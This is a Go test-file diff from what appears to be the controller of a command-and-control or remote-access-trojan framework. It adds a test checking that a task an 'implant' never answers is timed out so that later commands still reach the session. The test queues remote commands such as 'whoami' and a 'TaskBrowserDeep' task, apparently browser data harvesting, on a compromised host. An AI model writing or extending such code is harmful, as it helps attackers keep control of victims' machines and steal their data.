@@ -1,6 +1,7 @@
 package session
 
 import (
+	"strings"
 	"sync"
 	"testing"
 	"time"
@@ -125,4 +126,91 @@ func TestEnqueueFsAndScreenTypes(t *testing.T) {
 	if types[1] != protocol.CmdScreen {
 		t.Fatalf("screen %v", types)
 	}
+}
+
+// TestStalledTaskFreesTheQueue covers the wedged-session case: an old payload
+// silently ignores an unknown command, so the task never ends and every later
+// command queues behind it forever. Silence must fail the task, not the session.
+func TestStalledTaskFreesTheQueue(t *testing.T) {
+	clk := &fakeClock{t: time.Unix(2000, 0)}
+	h := NewHub(clk.Now)
+	var mu sync.Mutex
+	var sent []string
+	s := h.Attach("L1", "1.2.3.4:9", protocol.Register{}, func(typ protocol.Type, p []byte) error {
+		mu.Lock()
+		sent = append(sent, string(p))
+		mu.Unlock()
+		return nil
+	})
+
+	// the implant never answers this one
+	if _, err := h.Enqueue(s.ID, TaskBrowserDeep, ""); err != nil {
+		t.Fatal(err)
+	}
+	clk.Add(stallBatch + time.Second)
+	h.Tick()
+
+	tasks := h.allTasksFor(s.ID)
+	if len(tasks) != 1 || !tasks[0].Done || tasks[0].Err == "" {
+		t.Fatalf("stalled task not failed: %+v", tasks)
+	}
+	if tasks[0].Err == "" || !strings.Contains(tasks[0].Err, "无响应") {
+		t.Fatalf("error text should explain the stall: %q", tasks[0].Err)
+	}
+	if got := h.Get(s.ID); got == nil || got.Busy {
+		t.Fatalf("session still busy: %+v", got)
+	}
+
+	// the queue must move again: a new task is dispatched immediately
+	if _, err := h.Enqueue(s.ID, TaskExec, "whoami"); err != nil {
+		t.Fatalf("enqueue after stall: %v", err)
+	}
+	mu.Lock()
+	last := sent[len(sent)-1]
+	mu.Unlock()
+	if last != "whoami" {
+		t.Fatalf("next task not dispatched, last frame %q", last)
+	}
+
+	// an exec that is genuinely silent for a while is not cut early: it gets the
+	// long budget, and only then does the queue move on
+	if _, err := h.Enqueue(s.ID, TaskExec, "slow-but-running"); err != nil {
+		t.Fatal(err)
+	}
+	clk.Add(stallBatch + time.Second) // past the batch budget, under the exec one
+	h.Tick()
+	if got := h.Get(s.ID); got == nil || !got.Busy {
+		t.Fatalf("exec was cut too early: %+v", got)
+	}
+	clk.Add(stallTask)
+	h.Tick()
+	var who *Task
+	for _, x := range h.allTasksFor(s.ID) {
+		if x.Cmd == "whoami" {
+			who = x
+		}
+	}
+	if who == nil || !who.Done || who.Err == "" {
+		t.Fatalf("exec never timed out: %+v", who)
+	}
+	mu.Lock()
+	last = sent[len(sent)-1]
+	mu.Unlock()
+	if last != "slow-but-running" {
+		t.Fatalf("queued task not dispatched after the stall: %q", last)
+	}
+}
+
+// allTasksFor returns the tasks of one session (map order is random; callers
+// select by Cmd or Kind).
+func (h *Hub) allTasksFor(sid string) []*Task {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+	var out []*Task
+	for _, t := range h.tasks {
+		if t.SessionID == sid {
+			out = append(out, t)
+		}
+	}
+	return out
 }
